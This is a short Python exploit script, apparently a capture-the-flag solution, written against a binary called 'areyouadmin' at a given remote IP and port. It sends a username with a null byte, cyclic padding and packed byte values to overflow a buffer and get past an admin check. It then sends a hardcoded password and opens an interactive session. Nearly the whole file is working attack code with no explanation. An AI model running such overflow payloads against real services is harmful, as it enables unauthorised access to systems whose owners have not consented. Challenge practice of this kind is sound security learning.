#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./areyouadmin')

host = args.HOST or '194.5.207.113'
port = int(args.PORT or 7020)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+251
b *main+208
b *main+493
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
byte5 = 0x7b
byte1 = 0xe9
byte2 = 0x1e
byte3 = 0xbb
byte4 = 0x4c
re()
sl(b"AlexTheUser\x00" + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaaaaaa" + p32(byte1) + p32(byte2) + p32(byte3) + p32(byte4) + p32(byte5))

# sl("AlexTheUser\x00" + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa" + byte3 + "vaaawaaaxaaayaaaX")
re()
sl("4l3x7h3p455w0rd\x00" + "AlexTheUser\x00aaaa")
io.interactive()

"""
[byte5 = 123,
 byte1 = 233,
 byte2 = 30,
 byte3 = 187,
 byte4 = 76]
"""